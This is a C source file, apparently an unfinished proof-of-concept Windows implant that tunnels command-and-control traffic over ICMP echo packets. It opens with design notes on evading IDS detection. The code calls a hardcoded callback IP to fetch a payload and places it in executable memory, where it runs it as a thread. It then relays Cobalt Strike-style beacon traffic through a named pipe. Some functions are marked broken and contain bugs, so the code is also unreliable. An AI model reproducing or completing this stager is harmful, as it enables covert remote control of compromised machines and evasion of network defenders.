/*
POC: ICMP Send/Receive

Pros;
  - Quiet


Cons:

  - No protocol built in safeguards.
    - session tracking


Maybe Problems:

 - Type 8 sends the alphabet on basic ping checks. This might get flagged if not this value

 - [ ] OS likes to respond to icmp echo replies.
        Fix:
            option 1: Disable echo replies on linux:
                `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1`
            option 2: IP Tables filter out anything not containing TAG:
                 `sudo iptables -A INPUT -p icmp --icmp-type echo-request -m string --algo bm --string "HCKD" -j DROP`
                 - only works with unencrypted payloads due to tag in payload



Fixes:

 - Checkout waht some toosl that implemented ICMP did:
    PingTunnel?
    Loki?



Standard ICMP Flow for reference:
[ Your System  ]                  [ Remote Host (e.g. 8.8.8.8) ]
          |                                         |
          | ------ ICMP Echo Request  ------------> |
          |                                         |
          | <----- ICMP Echo Reply  --------------- |
          |                                         |



Idea flow for implementation
     [ (Agent) ]                              [ C2 Server ]
          |                                         |
     ---->| ------ ICMP Echo Request  ------------> | (ex, checkin, or send data back)--|
Do things |                                         |                                   | Server Stuff
     ^----| <----- ICMP Echo Reply  --------------- | (ex, command coming back) <--------
          |                                         |

//NOTE: ryan... go review ICMP standards/structure and amke sure you know all of this


ICMP Packet Header (bytes)
| Type (1) | Code (1) | Checksum (2) | Identifier (2) | Sequence Number (2) | Payload (variable, up to 32 bytes on win) |
|----------|----------|--------------|----------------|---------------------|-------------------------------------------|

or in a struct:

struct icmp_header {
    uint8_t Type;          // 8 for Echo Request
    uint8_t Code;          // 0
    uint16_t Checksum;     // Checksum of entire ICMP message
    uint16_t ID;           // Identifier to match requests/replies
    uint16_t Sequence;     // Sequence number for tracking requests
};

Protocol Breakdown:
    IMCP Header=8 bytes (64 bits)
    IP Headers=20
    Payload=
        MTU 1500: 1472 bytes per payload
        Max IPV4 size= 65507-28 = 65,479, but this is known as the ping of death & may flag
        "unix normal": 56 byte default payload field (+8 for header contents = 64 + 20 ipv4 = 84)
        "windows normal": 32 byte default payload field (+8 for header contents + 20 for ipv4 headers = 60)



Modifications of ICMP protocol for this application:

struct icmp_header {
    uint8_t Type;          // 8 for Echo Request
    uint8_t Code;          // 0
    uint16_t Checksum;     // Checksum of entire ICMP message
    uint16_t ID;           // Identifier to match requests/replies - lets use PID.
    uint16_t Sequence;     // Sequence number for tracking requests. Starts at 0, inline with windows ping behavior
};

Client sends initial message with length of inbound message. Sequence = 0. Seq 0 is ALWAYS the message size.

Payload should have the first 4 bytes be a tag. Default is "RQ47", on first 2 bytes. DO NOT use anything in alphabetical order (ex ABCD)... that's what normal
pings send, and will likely confuse the server.

Server should allocate a buffer of this size.

Server then monitors for packet with Seq 1, matching ID, and first 4 bytes being the TAG (ex, RQ47)
Server appends the data section to the buffer.
Server then Sends response back to ICMP request.

Client gets response data, this response MUST contain the tag, otherwise the response is discarded. This is so an OS reply doesn't slip past by accident, etc.

When client has sent all data OR a finish flag is received (CANNOT use seq or PID here), server stops listenening, and
passes data to Team Server




*/


#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#define ICMP_ECHO 8
#define ICMP_ECHOREPLY 0
//size of payload/data section of icmp.
//ideally, the program will do the math & figure out how to chunk messages based on this size. Currently, it does not
#define ICMP_PAYLOAD_SIZE 500 //in bytes 
//payload sizes: 32 = windows, 52 = linux, anything else is okay, but will be more suspicious to IDS's. Max is 1472. due to MTU. Otherwise you risk the packets fragmenting
// which could cause some issues too. 
#define IPV4_HEADER 20
#define ICMP_HEADER 8
#define ICMP_PACKET_SIZE (ICMP_HEADER + ICMP_PAYLOAD_SIZE) //icmp packet WITHOUT overhead of ipv4
#define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
#define ICMP_CALLBACK_SERVER "172.19.241.197"
#define ICMP_TAG "RQ47"
#define ICMP_TAG_SIZE 4

//cs options
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024


struct icmp_header {
    BYTE Type;
    BYTE Code;
    USHORT Checksum;
    USHORT ID;
    USHORT Sequence;
};


// Checksum function
USHORT checksum(USHORT* buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) {
        cksum += *(UCHAR*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

/* read a frame from a handle */
DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;

    /* read the 4-byte length */
    ReadFile(my_handle, (char*)&size, 4, &temp, NULL);

    /* read the whole thing in */
    while (total < size) {
        ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
        total += temp;
    }

    return size;
}

/* write a frame to a file */
void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
    DWORD wrote = 0;
    WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
    WriteFile(my_handle, buffer, length, &wrote, NULL);
}

int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload) {
    char packet[MAX_PACKET_SIZE] = { 0 };

    struct icmp_header* icmp = (struct icmp_header*)packet;
    icmp->Type = ICMP_ECHO;
    icmp->Code = 0;
    //icmp->ID = (USHORT)GetCurrentProcessId();
    //icmp->Sequence = 1;
    icmp->ID = htons((USHORT)GetCurrentProcessId());
    icmp->Sequence = htons(1);


    char* data = packet + sizeof(struct icmp_header);

    const char* tag = ICMP_TAG; // 4-byte tag

    // Ensure we don't overflow ICMP_PAYLOAD_SIZE
    // Final payload size = strlen(tag) + strlen(payload)
    if (strlen(tag) + strlen(payload) >= ICMP_PAYLOAD_SIZE) {
        printf("[-] Payload too large. Max allowed: %d bytes\n", ICMP_PAYLOAD_SIZE - (int)strlen(tag) - 1);
        return -1;
    }

    snprintf(data, ICMP_PAYLOAD_SIZE, "%s%s", tag, payload);

    icmp->Checksum = 0;
    icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));

    printf("[+] Sending ICMP Echo Request...\n");

    int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
    if (result == SOCKET_ERROR) {
        printf("[-] sendto failed: %d\n", WSAGetLastError());
        return -1;
    }

    printf("[+] Packet sent. Dump:\n");
    printf("    Type: %d\n", icmp->Type);
    printf("    Code: %d\n", icmp->Code);
    printf("    ID: %d\n", ntohs(icmp->ID));
    printf("    Seq: %d\n", ntohs(icmp->Sequence));
    printf("    Payload: %s\n", data);

    return 0;
}

#define TAG_SIZE 4
#define MAX_CHUNKS 1000 // adjust max fragments expected

char* reassembly_buffer = NULL;
int expected_size = 0;
int received_chunks = 0;
int total_chunks = 0;

int received_map[MAX_CHUNKS]; // track received fragments (0/1)

char* recv_icmp_fragments(SOCKET s) {
    /*
    BROKEN
    
    */
    printf("BROKEN: CHUNKS DO NOT FINISH, MEANING IT HANGS ON THE recv_icmp_fragments FUCNTION. Likely sometihgnoff with chunk math??\n");
    char recvbuf[MAX_PACKET_SIZE];
    SOCKADDR_IN from;
    int fromlen = sizeof(from);

    while (TRUE) {
        int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
        if (bytes == SOCKET_ERROR) {
            printf("[-] recvfrom failed: %d\n", WSAGetLastError());
            return NULL;
        }

        if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
            printf("[-] Packet too small\n");
            continue;
        }

        struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
        char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);

        if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
            printf("[-] Packet missing tag\n");
            continue;
        }

        USHORT seq = ntohs(icmp->Sequence);
        printf("[+] Received fragment seq=%d\n", seq);

        // Handle seq 0 - total size
        if (seq == 0) {
            // Next 4 bytes after tag is total payload size
            int size = 0;
            memcpy(&size, payload + TAG_SIZE, 4);
            expected_size = ntohl(size);
            printf("[+] Total payload size: %d\n", expected_size);

            // Allocate buffer to hold entire payload
            if (reassembly_buffer) free(reassembly_buffer);
            reassembly_buffer = (char*)malloc(expected_size);
            if (!reassembly_buffer) {
                perror("malloc");
                return NULL;
            }

            memset(received_map, 0, sizeof(received_map));
            received_chunks = 0;
            //total_chunks = (expected_size + ICMP_PAYLOAD_SIZE - 1) / ICMP_PAYLOAD_SIZE;
            // Instead of dividing by ICMP_PAYLOAD_SIZE, divide by “data per chunk = ICMP_PAYLOAD_SIZE – TAG_SIZE”.
            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
            total_chunks = (expected_size + data_per_chunk - 1) / data_per_chunk;


            continue; // wait for next packets
        }

        if (seq > 0 && seq <= total_chunks) {
            int chunk_index = seq - 1;
            if (received_map[chunk_index] == 1) {
                printf("[*] Duplicate fragment seq=%d\n", seq);
                continue; // skip duplicates
            }

            //int chunk_offset = chunk_index * ICMP_PAYLOAD_SIZE;
            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
            int chunk_offset = chunk_index * data_per_chunk;

            int chunk_size = bytes - IPV4_HEADER - sizeof(struct icmp_header) - TAG_SIZE;
            if (chunk_offset + chunk_size > expected_size) {
                chunk_size = expected_size - chunk_offset; // trim last chunk
            }

            memcpy(reassembly_buffer + chunk_offset, payload + TAG_SIZE, chunk_size);
            received_map[chunk_index] = 1;
            received_chunks++;

            printf("[+] Stored chunk %d/%d\n", received_chunks, total_chunks);

            if (received_chunks == total_chunks) {
                printf("[+] All fragments received!\n");
                return reassembly_buffer; // full payload ready
            }
        }
    }

    return NULL;
}


char* recv_icmp(SOCKET s) {
    char recvbuf[ICMP_PACKET_SIZE];
    SOCKADDR_IN from;
    int fromlen = sizeof(from);

    printf("[+] Waiting for ICMP Echo Reply...\n");

    int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
    if (bytes == SOCKET_ERROR) {
        printf("[-] recvfrom failed: %d\n", WSAGetLastError());
        return NULL;
    }

    printf("[+] Received %d bytes from %s\n", bytes, inet_ntoa(from.sin_addr));

    if (bytes < 28) {
        printf("[-] Packet too small to contain valid ICMP payload\n");
        return NULL;
    }

    struct icmp_header* icmp = (struct icmp_header*)(recvbuf + 20);
    char* payload = (char*)(recvbuf + 20 + sizeof(struct icmp_header));

    // Validate tag
    if (strncmp(payload, ICMP_TAG, 4) != 0) {
        printf("[-] Invalid or untagged ICMP payload\n");
        return NULL;
    }

    printf("    Type: %d\n", icmp->Type);
    printf("    Code: %d\n", icmp->Code);
    printf("    ID: %d\n", ntohs(icmp->ID));
    printf("    Seq: %d\n", ntohs(icmp->Sequence));

    // Calculate tagless payload size
    int payload_len = bytes - 20 - sizeof(struct icmp_header) - 4; // minus IP + ICMP header + tag
    if (payload_len <= 0) {
        printf("[-] No actual data after tag.\n");
        return NULL;
    }

    // Allocate buffer and copy payload
    char* out_data = (char*)malloc(payload_len + 1);
    if (!out_data) {
        perror("malloc");
        return NULL;
    }

    memcpy(out_data, payload + 4, payload_len);
    out_data[payload_len] = '\0'; // Null-terminate for safety

    printf("    Payload (tagless): %s\n", out_data);
    return out_data;
}


void debug() {
    printf("ICMP_ECHO: %d\n", ICMP_ECHO);
    printf("ICMP_ECHOREPLY: %d\n", ICMP_ECHOREPLY);
    printf("ICMP_PAYLOAD_SIZE: %d\n", ICMP_PAYLOAD_SIZE);
    printf("IPV4_HEADER: %d\n", IPV4_HEADER);
    printf("ICMP_HEADER: %d\n", ICMP_HEADER);
    printf("ICMP_PACKET_SIZE: %d\n", ICMP_PACKET_SIZE);
    printf("MAX_PACKET_SIZE: %d\n", MAX_PACKET_SIZE);
    printf("ICMP_CALLBACK_SERVER: %s\n", ICMP_CALLBACK_SERVER);
    printf("ICMP_TAG: %s\n", ICMP_TAG);
}


void print_hex_contents(const char* buffer, size_t length) {
    for (size_t i = 0; i < length; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
        if ((i + 1) % 16 == 0)
            printf("\n"); // newline every 16 bytes for readability
    }
    printf("\n");
}

int bridge_to_beacon() {

    //Setup stuff
    printf("[+] Creating raw socket...\n");
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == INVALID_SOCKET) {
        printf("[-] Error creating socket: %d\n", WSAGetLastError());
        return 1;
    }


    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);  // Replace with your C2 server IP

    //options to controller, which will get relayed to Server
    //send_icmp(s, &dest, "arch=x86");
    //send_icmp(s, &dest, "pipename=foobar");
    //send_icmp(s, &dest, "block=100");
    // NOPE - this is done controller side for simplicity rn

    //request payload from controller, which will get it from server
    char* payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // sus ram desc
    //send first checkin
    printf("PLACEHOLDER PAYLOAD SIZE\n");
    DWORD payload_size = 241540;
    if (send_icmp(s, &dest, "OI GIMME A PAYLOAD") == 0) {
        //and the server should return us the payload
        char* payload = recv_icmp_fragments(s);

    }
    printf("PAYLOAD: %s", payload);

    /* inject the payload stage into the current process */
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);

    //bridge to beacon's pipe
    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
    while (handle_beacon == INVALID_HANDLE_VALUE) {
        Sleep(1000);
        handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    }



    //while true... send icmp on data

    //soemthig something on pipe, realy datya back
    //if (send_icmp(s, &dest) == 0) {
    //    response = recv_icmp(s);
    //}
    //response send to pipe...


        /* setup our buffer */
    char* buffer = (char*)malloc(BUFFER_MAX_SIZE); /* 1MB should do */

    /*
     * relay frames back and forth
     */
    printf("[+] Starting comms with beacon");
    while (TRUE) {
        char* data_for_beacon = NULL; // recv_icmp will fill this

        /* read from our named pipe Beacon */
        DWORD beacon_output = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
        //DWORD beacon_output = "SomeOutput";
        //if beacon has nothing to send... this might break.
        if (beacon_output < 0) {
            break;
        }

        /* write to the External C2 server */
        //send_frame(socket_extc2, buffer, read);

        //send back beacon output
        if (send_icmp(s, &dest, beacon_output) == 0) {
            //and get next command if any
            data_for_beacon = recv_icmp(s);
        }


        /* write to our named pipe Beacon */
        write_frame(handle_beacon, buffer, data_for_beacon);
        //printf("Fake Write Frame...");
        Sleep(1000);

        /* read from the External C2 server */
        //read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
        //if (read < 0) {
        //    break;
        //}


    }

    /* close our handles */
    CloseHandle(handle_beacon);


    //cleanup
    closesocket(s);
    WSACleanup();
}




int main() {
    printf("[+] ICMP WIN\n");
    const char* SERVER_IP = ICMP_CALLBACK_SERVER;
    printf("[+] SERVER: %s\n", SERVER_IP);

    debug();

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    bridge_to_beacon();
    //if (send_icmp(s, &dest) == 0) {
    //    recv_icmp(s);
    //}


    return 0;
}
